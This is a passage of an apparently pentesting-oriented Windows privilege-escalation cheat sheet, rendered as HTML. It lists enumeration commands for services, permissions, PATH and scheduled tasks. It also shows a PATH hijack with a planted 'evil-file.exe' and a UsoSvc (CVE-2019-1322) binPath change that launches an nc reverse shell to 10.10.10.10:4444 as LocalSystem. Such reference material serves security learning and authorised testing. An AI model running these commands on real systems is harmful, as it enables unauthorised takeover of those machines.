</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s2">"Select * from Win32_Process"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-notlike</span><span class="w"> </span><span class="s2">"svchost*"</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">Handle</span><span class="p">,</span><span class="w"> </span><span class="p">@{</span><span class="nx">Label</span><span class="o">=</span><span class="s2">"Owner"</span><span class="p">;</span><span class="nx">Expression</span><span class="o">=</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">GetOwner</span><span class="p">()</span><span class="o">.</span><span class="nf">User</span><span class="p">}}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nt">-AutoSize</span><span class="w">
</span><span class="n">Get-Process</span><span class="w">
</span><span class="nx">Get-Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ProcessName</span><span class="w"> </span><span class="o">-notlike</span><span class="w"> </span><span class="s2">"svchost*"</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nx">ProcessName</span><span class="p">,</span><span class="w"> </span><span class="nx">Id</span><span class="w">
</span><span class="n">Get-Service</span><span class="w">
</span></code></pre></div></div> <h2 id="enumerate-unquoted-paths"> <a href="#enumerate-unquoted-paths" class="anchor-heading" aria-labelledby="enumerate-unquoted-paths"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate Unquoted paths </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Are there any unquoted service paths?</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">displayname</span><span class="p">,</span><span class="nx">pathname</span><span class="p">,</span><span class="nx">startmode</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="s2">"Auto"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"C:\Windows\\"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"""
wmic service get name,displayname,pathname,startmode |findstr /i "</span><span class="nx">Auto</span><span class="s2">" |findstr /i /v "</span><span class="nx">C:\\Windows\\\\</span><span class="s2">" |findstr /i /v """</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">displayname</span><span class="p">,</span><span class="nx">startmode</span><span class="p">,</span><span class="nx">pathname</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"C:\\Windows\\\\"</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"""

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {</span><span class="bp">$_</span><span class="s2">.StartMode -eq "</span><span class="nx">Auto</span><span class="s2">" -and </span><span class="bp">$_</span><span class="s2">.PathName -notlike "</span><span class="nx">C:\Windows</span><span class="o">*</span><span class="s2">" -and </span><span class="bp">$_</span><span class="s2">.PathName -notlike '"</span><span class="o">*</span><span class="s1">'} | select PathName,DisplayName,Name
</span></code></pre></div></div> <h2 id="path-interception"> <a href="#path-interception" class="anchor-heading" aria-labelledby="path-interception"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> $PATH Interception </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># PATH contains a writeable folder with low privileges? The writeable folder is _before_ the folder that contains the legitimate binary?</span><span class="w">
</span><span class="n">//</span><span class="p">(</span><span class="n">Powershell</span><span class="p">)</span><span class="w"> </span><span class="n">List</span><span class="w"> </span><span class="nx">contents</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">PATH</span><span class="w"> </span><span class="nx">environment</span><span class="w"> </span><span class="nx">variable</span><span class="w">
</span><span class="n">//EXAMPLE</span><span class="w"> </span><span class="nx">OUTPUT:</span><span class="w"> </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\nodejs\</span><span class="p">;</span><span class="n">C:\WINDOWS\system32</span><span class="w">
</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">Path</span><span class="w">

</span><span class="n">//See</span><span class="w"> </span><span class="nx">permissions</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">folder</span><span class="w">
</span><span class="n">//EXAMPLE</span><span class="w"> </span><span class="nx">OUTPUT:</span><span class="w"> </span><span class="nx">BUILTIN\Users:</span><span class="w"> </span><span class="nx">GR</span><span class="p">,</span><span class="nx">GW</span><span class="w">
</span><span class="n">icacls.exe</span><span class="w"> </span><span class="s2">"C:\Program Files\nodejs\"</span><span class="w">

</span><span class="n">//Place</span><span class="w"> </span><span class="nx">our</span><span class="w"> </span><span class="nx">evil-file</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">folder.</span><span class="w">
</span><span class="n">copy</span><span class="w"> </span><span class="nx">evil-file.exe</span><span class="w"> </span><span class="s2">"C:\Program Files\nodejs\cmd.exe"</span><span class="w">

</span><span class="n">Because</span><span class="w"> </span><span class="p">(</span><span class="kr">in</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="nx">example</span><span class="p">)</span><span class="w"> </span><span class="s2">"C:\Program Files\nodejs"</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nx">before</span><span class="w"> </span><span class="s2">"C:\WINDOWS\system32"</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">PATH</span><span class="w"> </span><span class="nx">variable</span><span class="p">,</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">next</span><span class="w"> </span><span class="nx">time</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">runs</span><span class="w"> </span><span class="s2">"cmd.exe"</span><span class="p">,</span><span class="w"> </span><span class="nx">our</span><span class="w"> </span><span class="nx">evil</span><span class="w"> </span><span class="nx">version</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">nodejs</span><span class="w"> </span><span class="nx">folder</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">run</span><span class="p">,</span><span class="w"> </span><span class="nx">instead</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">legitimate</span><span class="w"> </span><span class="nx">one</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">system32</span><span class="w"> </span><span class="nx">folder.</span><span class="w">
</span></code></pre></div></div> <h2 id="enumerate-services-permissions"> <a href="#enumerate-services-permissions" class="anchor-heading" aria-labelledby="enumerate-services-permissions"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate Services Permissions </h2> <div class="table-wrapper"><table> <thead> <tr> <th style="text-align: center">Mask</th> <th style="text-align: left">Permissions</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">F</td> <td style="text-align: left">Full access</td> </tr> <tr> <td style="text-align: center">M</td> <td style="text-align: left">Modify access</td> </tr> <tr> <td style="text-align: center">RX</td> <td style="text-align: left">Read and Execute</td> </tr> <tr> <td style="text-align: center">R</td> <td style="text-align: left">Read-only</td> </tr> <tr> <td style="text-align: center">W</td> <td style="text-align: left">Write-only</td> </tr> </tbody> </table></div> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Single service permissions</span><span class="w">
</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files\Serviio\bin\ServiioService.exe"</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">caption</span><span class="o">=</span><span class="s2">"Serviio"</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">caption</span><span class="p">,</span><span class="w"> </span><span class="nx">state</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">qc</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">				</span><span class="c"># query the configuration of a service</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nt">-ucqv</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">Service_Name</span><span class="err">&gt;</span><span class="w"> 	</span><span class="c"># Check service rights</span><span class="w">

</span><span class="c"># Find PATH directories with weak permissions</span><span class="w">
</span><span class="kr">for</span><span class="w"> </span><span class="n">/f</span><span class="w"> </span><span class="s2">"tokens=2 delims='='"</span><span class="w"> </span><span class="o">%</span><span class="nx">a</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="p">(</span><span class="s1">'wmic service list full^|find /i "pathname"^|find /i /v "system32"'</span><span class="p">)</span><span class="w"> </span><span class="kr">do</span><span class="w"> </span><span class="err">@</span><span class="n">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">a</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">c:\windows\temp\permissions.txt</span><span class="w">
</span><span class="kr">for</span><span class="w"> </span><span class="n">/f</span><span class="w"> </span><span class="nx">eol</span><span class="err">^</span><span class="o">=</span><span class="err">^</span><span class="s2">"^ delims^=^"</span><span class="w"> </span><span class="o">%</span><span class="n">a</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="p">(</span><span class="n">c:\windows\temp\permissions.txt</span><span class="p">)</span><span class="w"> </span><span class="kr">do</span><span class="w"> </span><span class="n">cmd.exe</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">icacls</span><span class="w"> </span><span class="s2">"%a"</span><span class="w">

</span><span class="n">sc</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">state</span><span class="o">=</span><span class="n">all</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"SERVICE_NAME:"</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">Servicenames.txt</span><span class="w">
</span><span class="kr">FOR</span><span class="w"> </span><span class="n">/F</span><span class="w"> </span><span class="o">%</span><span class="nx">i</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="p">(</span><span class="n">Servicenames.txt</span><span class="p">)</span><span class="w"> </span><span class="kr">DO</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">i</span><span class="w">
</span><span class="kr">type</span><span class="w"> </span><span class="n">Servicenames.txt</span><span class="w">
</span><span class="nx">FOR</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"tokens=2 delims= "</span><span class="w"> </span><span class="o">%</span><span class="nx">i</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="p">(</span><span class="n">Servicenames.txt</span><span class="p">)</span><span class="w"> </span><span class="kr">DO</span><span class="w"> </span><span class="err">@</span><span class="n">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">i</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">services.txt</span><span class="w">
</span><span class="kr">FOR</span><span class="w"> </span><span class="n">/F</span><span class="w"> </span><span class="o">%</span><span class="nx">i</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="p">(</span><span class="n">services.txt</span><span class="p">)</span><span class="w"> </span><span class="kr">DO</span><span class="w"> </span><span class="err">@</span><span class="n">sc</span><span class="w"> </span><span class="nx">qc</span><span class="w"> </span><span class="o">%</span><span class="nx">i</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"BINARY_PATH_NAME"</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">path.txt</span><span class="w">


</span><span class="c"># Any weak service permissions? Can we reconfigure anything? Again, upload accesschk.</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nt">-uwcqv</span><span class="w"> </span><span class="s2">"Everyone"</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">/accepteula</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nt">-uwcqv</span><span class="w"> </span><span class="s2">"Authenticated Users"</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">/accepteula</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nt">-uwcqv</span><span class="w"> </span><span class="s2">"Users"</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">/accepteula</span><span class="w">

</span><span class="c"># Show service properties</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nt">-ucqv</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/accepteula</span><span class="w">


</span><span class="c"># Interact with a service</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service</span><span class="err">&gt;</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">binpath</span><span class="o">=</span><span class="s2">"C:\Path\to\binary.exe"</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service</span><span class="err">&gt;</span><span class="w">

</span><span class="n">net</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service</span><span class="err">&gt;</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># Example with Windows 10 - CVE-2019-1322 UsoSvc</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">UsoSvc</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">usosvc</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="s2">"C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">UsoSvc</span><span class="w"> </span><span class="nx">binpath</span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">UsoSvc</span><span class="w"> </span><span class="nx">binpath</span><span class="o">=</span><span class="w"> </span><span class="s2">"cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">qc</span><span class="w"> </span><span class="nx">usosvc</span><span class="w">
</span><span class="p">[</span><span class="n">SC</span><span class="p">]</span><span class="w"> </span><span class="n">QueryServiceConfig</span><span class="w"> </span><span class="nx">SUCCESS</span><span class="w">

</span><span class="n">SERVICE_NAME:</span><span class="w"> </span><span class="nx">usosvc</span><span class="w">
        </span><span class="kr">TYPE</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="mi">20</span><span class="w">  </span><span class="n">WIN32_SHARE_PROCESS</span><span class="w">
        </span><span class="nx">START_TYPE</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">2</span><span class="w">   </span><span class="nx">AUTO_START</span><span class="w">  </span><span class="p">(</span><span class="n">DELAYED</span><span class="p">)</span><span class="w">
        </span><span class="n">ERROR_CONTROL</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">1</span><span class="w">   </span><span class="nx">NORMAL</span><span class="w">
        </span><span class="n">BINARY_PATH_NAME</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\Users\mssql-svc\Desktop\nc.exe</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nx">4444</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">
        </span><span class="n">LOAD_ORDER_GROUP</span><span class="w">   </span><span class="p">:</span><span class="w">
        </span><span class="n">TAG</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
        </span><span class="n">DISPLAY_NAME</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">Update</span><span class="w"> </span><span class="nx">Orchestrator</span><span class="w"> </span><span class="nx">Service</span><span class="w">
        </span><span class="n">DEPENDENCIES</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">rpcss</span><span class="w">
        </span><span class="n">SERVICE_START_NAME</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">LocalSystem</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">UsoSvc</span><span class="w">
</span></code></pre></div></div> <h2 id="enuemrate--registry-permissions"> <a href="#enuemrate--registry-permissions" class="anchor-heading" aria-labelledby="enuemrate--registry-permissions"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enuemrate Registry permissions </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">accesschk.exe</span><span class="w"> </span><span class="nx">/accepteula</span><span class="w"> </span><span class="nt">-uvwqk</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">reg</span><span class="err">&gt;</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">reg</span><span class="err">&gt;</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">add</span><span class="w">

</span><span class="c"># Powershell</span><span class="w">
</span><span class="n">Get-Acl</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">reg</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-List</span><span class="w">

</span><span class="c">## If we can modify the registry, we can make the service points to our custom binary</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">reg</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">reg_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">reg_type</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">binary_directory</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/f</span><span class="w">
</span></code></pre></div></div> <h2 id="enumerate-directories-permissions"> <a href="#enumerate-directories-permissions" class="anchor-heading" aria-labelledby="enumerate-directories-permissions"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate Directories Permissions </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Are there any weak folder or file permissions?</span><span class="w">
</span><span class="c"># Full Permissions for Everyone or Users on Program Folders?</span><span class="w">
</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files\*"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"(F)"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"Everyone"</span><span class="w">
</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\*"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"(F)"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"Everyone"</span><span class="w">

</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files\*"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"(F)"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"BUILTIN\Users"</span><span class="w">
</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\*"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"(F)"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"BUILTIN\Users"</span><span class="w">

</span><span class="c"># Modify Permissions for Everyone or Users on Program Folders?</span><span class="w">
</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files\*"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"(M)"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"Everyone"</span><span class="w">
</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\*"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"(M)"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"Everyone"</span><span class="w">

</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files\*"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"(M)"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"BUILTIN\Users"</span><span class="w">
</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\*"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"(M)"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"BUILTIN\Users"</span><span class="w">

</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s1">'C:\Program Files\*'</span><span class="p">,</span><span class="s1">'C:\Program Files (x86)\*'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Get-Acl</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="nt">-EA</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where</span><span class="w"> </span><span class="p">{(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Access</span><span class="o">|</span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">IdentityReference</span><span class="p">)</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'Everyone'</span><span class="p">}</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{}}</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s1">'C:\Program Files\*'</span><span class="p">,</span><span class="s1">'C:\Program Files (x86)\*'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Get-Acl</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="nt">-EA</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where</span><span class="w"> </span><span class="p">{(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Access</span><span class="o">|</span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">IdentityReference</span><span class="p">)</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'BUILTIN\Users'</span><span class="p">}</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{}}</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"C:\Program Files"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-ACL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">AccessToString</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"Everyone\sAllow\s\sModify"</span><span class="p">}</span><span class="w">

</span><span class="c"># Writeable folders and files?</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nt">-quws</span><span class="w"> </span><span class="s2">"Everyone"</span><span class="w"> </span><span class="s2">"C:\Program Files"</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nt">-qwsu</span><span class="w"> </span><span class="s2">"Everyone"</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nt">-qwsu</span><span class="w"> </span><span class="s2">"Authenticated Users"</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nt">-qwsu</span><span class="w"> </span><span class="s2">"Users"</span><span class="w"> </span><span class="o">*</span><span class="w">
</span></code></pre></div></div> <h2 id="enumerate-scheduled-tasks"> <a href="#enumerate-scheduled-tasks" class="anchor-heading" aria-labelledby="enumerate-scheduled-tasks"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate Scheduled Tasks </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># What scheduled tasks are there? Anything custom implemented?</span><span class="w">
</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/query</span><span class="w"> </span><span class="nx">/fo</span><span class="w"> </span><span class="nx">LIST</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">TaskName</span><span class="w">
</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/query</span><span class="w"> </span><span class="nx">/fo</span><span class="w"> </span><span class="nx">LIST</span><span class="w"> </span><span class="nx">/v</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">C:\windows\tasks</span><span class="w">

